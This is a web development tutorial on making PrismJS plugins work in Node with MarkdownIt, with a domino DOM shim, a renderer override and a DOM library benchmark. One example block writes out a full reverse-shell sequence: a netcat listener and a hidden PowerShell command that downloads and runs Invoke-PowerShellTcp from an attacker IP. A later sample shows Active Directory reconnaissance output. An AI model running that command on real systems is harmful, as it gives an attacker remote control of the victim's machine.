---
title: How to Use PrismJS Plugins with NodeJS and MarkdownIt
excerpt: Improve your storytelling with these dead simple hacks for rendering fancy Prism plugins in Node!
tags:
  - web
  - js
  - tutorial
  - meta
  - performance
thumbnail_src: assets/thumbnail.jpg
---

With over 7 million weekly downloads on NPM, PrismJS is one of the most widely used code highlighting packages in JavaScript, lauded for its unparalleled extensibility through plugins. But one recurring issue plagues developers: most plugins require a {% abbr "DOM", "document object model, responsible for managing the UI you see in your wonderful browser" %}! Fancy plugins such as `command-line`, `line-numbers`, and the toolbar suite require a DOM to manipulate HTML. This isn't normally possible in runtime environments such as Node, which aren't designed to render UIs, hence, no DOM.

In this post, I’ll demonstrate a few simple changes to easily coerce these plugins into compatibility with NodeJS and MarkdownIt, a popular markdown renderer.^[Instead of monkeypatching the environment (and potentially affecting other libraries), we could also just write new code using regex to modify HTML, removing the requirement for a DOM altogether. But let’s face it, I sleep more soundly knowing the current implementation is mature and battle-tested. By introducing a DOM API to Node, you're placing trust in a library to be spec-compliant. By handwriting regex, you're placing trust in your code (and regex!) to work. Which would you rather have?]

## Why enhance codeblocks?

Simple codeblocks suffice for most writers who need supporting text with pretty colours. But maybe you want your codeblocks to simply look *flashier*. Or maybe you want better tools *to tell a story*!

To tell a good story, the characters, plot, and location need to be clear to the audience. Similarly, blog posts and tutorials benefit from enhancements such as command-line demarcations, line numbers, labels, and inline markup.

There are many cases where such codeblocks are warranted (brackets contain remedial plugins):

- Interaction: input and output should be contrasted, think: shell or Jupyter notebook (command-line)
- A post compares or demonstrates a technique in multiple languages (show-language)
- Code is executed in multiple, distinct environments (command-line, label)
- A post refers to a code snippet within a large file (line-numbers)
- A post refers to multiple files (label)

{% details "Example: Catching Reverse Shells (Labels and Command-Line)" %}
This is really useful when presenting narratives for red teaming scenarios, where multiple machines are involved.^[Not that I have any red teaming writeups, but I foresee the possibility of such posts in the future.] Here are some simple notes on catching a reverse shell from a Windows machine.

1. *Get our IP.*

    ```shell {data-label=Attacker .command-line data-prompt="kali@kali $" data-output=2-10}
    ifconfig
    eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.100.100  netmask 255.255.255.0  broadcast 192.168.100.255
        ...
    ```

2. *Listen for incoming connections on port 4444.*

    ```shell {data-label=Attacker .command-line data-prompt="kali@kali $"}
    nc -nlvp 4444
    ```

3. *Download and execute `Invoke-PowerShellTcp` on the victim.*
    
    ```powershell {data-label=Victim .command-line data-prompt="PS C:\>"}
    powershell -nop -w hidden -c "iex (New-Object Net.WebClient).DownloadString('http://192.168.100.100/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.100.100 -Port 4444" 
    ```

It's clear that our character shifts from Scene 1 to Scene 2, with less sentence clutter.
{% enddetails %}

Another problem I notice on many documentation pages is the use of `$`, denoting the start of a new command on a shell. These are poor for a couple reasons: it doesn't accurately present the actual code (from both the writer's and readers' PoV) and may disrupt syntax highlighters.

{% details "Example: The Obstructive $ (Command-Line)" %}

These are commonly seen in installation scripts or guides. Here's an example installing a Makefile-based project:

```sh
$ tar -xvzf who_doesnt_like_to_copy_lines_of_code_one_by_one.tar.gz
$ cd who_doesnt_like_to_copy_lines_of_code_one_by_one
$ ./configure
$ make -j4
$ make install
```

Atrocious! You can't copy multiple lines without the nasty $ getting in the way! What terrible UX. It's like when your parent or sibling stands in front of the television!^[To be fair, there's an argument to be made for "not running these commands all at once". Failure isn't handled. But this largely exists in relatively low-level build commands for C/C++, which are renowned for their many toolchains (read: potential build errors).]

Compare it to this:

```sh {.command-line data-prompt="$"}
tar -xvzf who_doesnt_like_to_copy_lines_of_code_one_by_one.tar.gz
cd who_doesnt_like_to_copy_lines_of_code_one_by_one
./configure
make -j4
make install
```

{% enddetails %}

With that small rant out of the way, let's begin!

## Step 1: Expose a DOM API

To make Node seem like a browser, we want to introduce `document` and `window` globals. These are the two keys variables used by Prism to manipulate HTML. `window` isn't really called; it's mostly for UI behaviour. `document`, however, is used rather heavily.

{% alert "danger" %}
This could have adverse effects on libraries which use unified code for both browser and runtime environments. Introducing `document` and `window` *might* have unintended spillover effects... In most cases though, this shouldn't break anything.
{% endalert %}

The easiest solution is to glue a DOM manipulation library such as JSDOM or domino, and create global `window`/`document` variables. I’ve chosen to use [domino](https://www.npmjs.com/package/domino) since it renders codeblocks much faster than JSDOM, with zero additional dependencies.

```sh
npm install domino
```

```js
const domino = require('domino');
global.window = domino.createWindow('');
global.getComputedStyle = global.window.getComputedStyle;
global.document = global.window.document;
```

NodeJS's `global` object enables us to add global variables. Now Prism can access our `window` and `document` globals.

For convenience later, we’ll also create a function which converts HTML strings to DOM objects. We'll use the `template` element to achieve this.^[Unlike JSDOM, domino doesn't have a "create fragment from HTML" function, so `template` is the [suggested workaround](https://github.com/fgnass/domino/issues/73).]

```js
function textToDOM(text) {
  const templ = document.createElement('template');
  templ.innerHTML = text;
  return templ.content;
}
```

## Step 2: Override MarkdownIt Fence Rendering

While MarkdownIt works great out-of-the-box, the default {% abbr "rendering", "Rendering is the process of convert raw code to a presentable HTML format." %} rules for code blocks are inherently incompatible with most Prism plugins. MarkdownIt's renderer passes text as input to an arbitrary highlight function, but Prism’s full-featured highlighting expects a DOM Element node. They don't speak the same language!

Prism has two primary highlight functions: `Prism.highlight` and `Prism.highlightElement`. Most server-side libraries are happy to use the former. But a lot of *hooks* aren't called by `.highlight`, so we'll also have to customise the renderer to call `.highlightElement`.

We'll reference [MarkdownIt's default fence rule](https://github.com/markdown-it/markdown-it/blob/0fe7ccb4b7f30236fb05f623be6924961d296d3d/lib/renderer.mjs#L29) and customise it accordingly.

{% alert "danger" %}
The code presented below will override the `.renderer.rules.fence` rule completely, overwriting any previous implementations.

If you use another plugin which reuses the fence rule (e.g. `markdown-it-prism`), consider calling code in this order: 1) the below fence-override code, 2) other code. This way no code is overwritten and lost.
{% endalert %}

Here are the changes we'll make:

1. Remove the default text-based highlighting `options.highlight`. We still need to escape the HTML because we'll substitute it in a HTML string.
2. (Optional, if you want `diff` support.) Handle `diff-*` languages by loading the right language.
3. Wrap the escaped code in `<div><pre><code>` with the right attributes^[Normally, wrapping it in `<pre><code>` is sufficient. But some plugins such as toolbar will traverse up to the parent of `pre`, so... `<div><pre><code>`. Yay, more workarounds!], convert it to a DOM element, highlight it to `Prism.highlightElement`, then return the rendered HTML.
4. We also moved the attributes to `<pre>` instead of `<code>`, which is required for PrismJS to function properly.

The most important part is step 3, where we call Prism magic with `.highlightElement`.

```diff-js
 markdownit.renderer.rules.fence = function (tokens, idx, options, _env, slf) {
   ...
+  const result = `<div><pre${preAttrs}><code class="${codeClasses}">${escaped}</code></pre></div>`
+  const el = textToDOM(result)
+  Prism.highlightElement(el.firstChild.firstChild.firstChild)
+  return el.firstChild.firstChild.outerHTML
   ...
 }
```

{% details "See Full Changes" %}
```diff-js
 markdownit.renderer.rules.fence = function (tokens, idx, options, _env, slf) {
   const token = tokens[idx];
   const info = token.info ? unescapeAll(token.info).trim() : '';
   ...

-  let highlighted
-  if (options.highlight) {
-    highlighted = options.highlight(token.content, langName, langAttrs) || escapeHtml(token.content)
-  } else {
-    highlighted = escapeHtml(token.content)
-  }
+  const escaped = escapeHtml(token.content) // 1

-  if (highlighted.indexOf('<pre') === 0) {
-    return highlighted + '\n'
-  }

   // If language exists, inject class gently, without modifying original token.
   // May be, one day we will add .deepClone() for token and simplify this part, but
   // now we prefer to keep things local.
   if (info) {
     const i = token.attrIndex('class')
     const tmpAttrs = token.attrs ? token.attrs.slice() : []
     
     if (i < 0) {
       tmpAttrs.push(['class', options.langPrefix + langName])
     } else {
       tmpAttrs[i] = tmpAttrs[i].slice()
       tmpAttrs[i][1] += ' ' + options.langPrefix + langName
     }
       
     // Fake token just to render attributes
     const tmpToken = {
       attrs: tmpAttrs
     }

+    // Make sure language is loaded. // 2
+    if (langName.startsWith('diff-')) {
+      const diffRemovedRawName = langName.substring('diff-'.length)
+      if (!Prism.languages[diffRemovedRawName])
+        PrismLoad([diffRemovedRawName])
+    } else {
+      if (!Prism.languages[langName])
+        PrismLoad([langName])
+    }
    
     // 3, 4
+    // Some plugins such as toolbar venture into codeElement.parentElement.parentElement,
+    // so we'll wrap the `pre` in an additional `div` for class purposes.
+    const preAttrs = slf.renderAttrs(tmpToken)
+    const codeClasses = options.langPrefix + langName
+    const result = `<div><pre${preAttrs}><code class="${codeClasses}">${escaped}</code></pre></div>`
+    const el = textToDOM(result)
+    Prism.highlightElement(el.firstChild.firstChild.firstChild)
+    return el.firstChild.firstChild.outerHTML
-    return `<pre><code${slf.renderAttrs(tmpToken)}>${highlighted}</code></pre>\n`
   }

   // 4
+  return `<pre${slf.renderAttrs(token)}><code>${escaped}</code></pre>\n`
-  return `<pre><code${slf.renderAttrs(token)}>${highlighted}</code></pre>\n`
 }
```
{% enddetails %}

If you're using an {% abbr "SSR", "server-side rendering, e.g. NextJS" %} framework or {% abbr "SSG", "static site generator" %}, you'll need to first access the MarkdownIt object.

In 11ty, for instance, we can access it like so:

```js {data-label=eleventy.config.js}
eleventyConfig.amendLibrary('md', mdLib => {
  mdLib.renderer.rules.fence = function (...) { ... }
});
```

## Step 3: Use `markdown-it-attrs`

To add attributes to your codeblocks, introduce [`markdown-it-attrs`](https://github.com/arve0/markdown-it-attrs/) to your MarkdownIt object.

You can now add attributes and classes to your codeblocks which will then be parsed by Prism.

For instance, this:

<pre class="language-md">
<code>```js {data-label=hello.js .inspect-me-lol}
function hello() {
  console.log("Hello world!");
}
```</code>
</pre>

becomes:

```js {data-label=hello.js .inspect-me-lol}
function hello() {
  console.log("Hello world!");
}
```

{% alert "warning" %}
In 11ty, `markdown-it-attrs` is incompatible with `eleventy-plugin-syntaxhighlight` due to the way codeblocks are parsed.
{% endalert %}

## Step 4: (Optional) Modify Plugins

With those two changes, we have all we need to start importing fancy plugins!

In case you wish to fine-tune some plugins, you can always copy them into your local project and modify them directly! Some changes I made were:

- modding `line-numbers` for compatibility with `command-line` and `diff` (Yes, this doesn't really make sense, but who knows if I'll need it in the future?)
- modding `show-language` to display the base language when the highlight language is `diff-*`.

You can also add custom attributes with some simple CSS! For instance, I added a CSS class which hides the command-line prompt when a `data-rw-prompt` attribute is specified.^[Here, rw stands for responsive width.] This is useful for long prompts, which may cover the entire screen's width when scrolling on a phone.

```css
@media (max-width: 576px) {
    /* rw-prompt: response width prompt */
    pre[data-rw-prompt] .command-line-prompt {
        display: none;
    }
}
```

And here it is in action on some notes. Try viewing on both mobile and computer (or use your browser DevTools).

```powershell {.command-line data-rw-prompt data-prompt="PS C:\Users\Bob>" data-output=2-100}
Get-DomainTrust -domain dollarcorp.moneycorp.local

SourceName      : dollarcorp.moneycorp.local
TargetName      : moneycorp.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/12/2022 5:59:01 AM
WhenChanged     : 9/25/2024 10:12:06 PM
```


## Benchmarking DOM Libraries

Understandably, one major bottleneck in our strategy is DOM manipulation. A suitable library needs to parse HTML fragments, manipulate DOM elements, and create new ones.

Although I originally selected JSDOM in my quick-n-dirty hack for its popularity, I later switched to domino for a significant (2x!) speedup. This is based on a simple benchmark, which compares the three most popular(?) NodeJS DOM-manipulation libraries: [JSDOM](https://www.npmjs.com/package/jsdom), [domino](https://www.npmjs.com/package/domino), and [LinkeDOM](https://www.npmjs.com/package/linkedom).

{% image "assets/dom-benchmark.png", "jw-60 alpha-imgv", "Benchmark of time to render the ~400 codeblocks on this site with JSDOM, domino, and LinkeDOM." %}

<sup>Benchmark of time to render the ~400 codeblocks on this site with JSDOM, domino, and LinkeDOM. Lower time = faster.</sup>
{.caption}

| Library  | Mean (ms) | Min. (ms) | Max. (ms) |
| -------- | --------- | --------- | --------- |
| JSDOM    | 583       | 492       | 1007      |
| domino   | 265       | 227       | 477       |
| LinkeDOM | 280       | 214       | 666       |


{% details "Benchmark Details and CLI Output" %}

The benchmark was run on a MacBook Air with a 1.6 GHz Intel Core i5 processor and 8 GB 2133 MHz LPDDR3 RAM. Benchmark code can be found [*here*](https://github.com/TrebledJ/trebledj.github.io/tree/1f1163a022738da81f6a83f06dceb793c68e856d/eleventy/benchmarks/codeblocks#readme).

```shell {.command-line data-prompt="$" data-output=2-100}
node eleventy/benchmarks/codeblocks
Running: JSDOM
[auto] Target 199 runs (~604ms/run) in 120s.
 --- [JSDOM] ---
 - 199 runs
 - mean: µ=582.964ms / σ=70.796ms
 - minmax: 491.888ms / 1007.477ms

Running: domino
[auto] Target 454 runs (~264ms/run) in 120s.
 --- [domino] ---
 - 454 runs
 - mean: µ=265.399ms / σ=42.418ms
 - minmax: 226.817ms / 476.795ms

Running: LinkeDOM
[auto] Target 444 runs (~270ms/run) in 120s.
 --- [LinkeDOM] ---
 - 444 runs
 - mean: µ=279.861ms / σ=69.691ms
 - minmax: 214.418ms / 666.151ms
```
{% enddetails %}

Moreover, domino has 0 dependencies — it's basically written from the ground up! JSDOM has 21 dependencies. A lower number of dependencies reduces the attack surface of an application; and with increasing reports of [supply chain attacks](/posts/twelve-days-to-secure-your-systems/#software-components-and-the-supply-chain), it's good to limit such risks.

## Final Remarks

I'll be the first to admit — this is a rather crude hack with some loose ends.^[It would be better to pass codeblock attributes directly to Prism without the extra stringification and parsing. Guess I'll leave this as an exercise for the front-end engineers.] But it works! Not to mention, it looks nice with enough CSS! And to some that's all that matters.

For those interested in the code, you can check it out here:

* [module](https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/eleventy/detail/markdown-it/markdown-it-prism-adapter.js)
* [example usage](https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/eleventy/markdown.js#L74-L88)

Just copy the module into your build and load it.

Here are a few other customisations to plugins I made.
* copy-to-clipboard: [plugin](https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/eleventy/detail/prism/prism-copy-to-clipboard.js) / [js](https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/assets/js.bundle/common/prism-copy-to-clipboard.js) / [css](https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/assets/css/prism/prism-custom.css)
* line-numbers: [plugin](https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/eleventy/detail/prism/prism-line-numbers.js) / [css](https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/assets/css/prism/prism-line-numbers.css)
* show-language: [plugin](https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/eleventy/detail/prism/prism-show-language.js)
* command-line: [css](https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/assets/css/prism/prism-command-line.css)
* toolbar: [css](https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/assets/css/prism/prism-toolbar.css)
* diff: [css](https://github.com/TrebledJ/trebledj.github.io/blob/e110c1861f566907019f4384b3eb5d7d7861ccc0/assets/css/prism/prism-diff.css) (based on a Eleventy customisation)

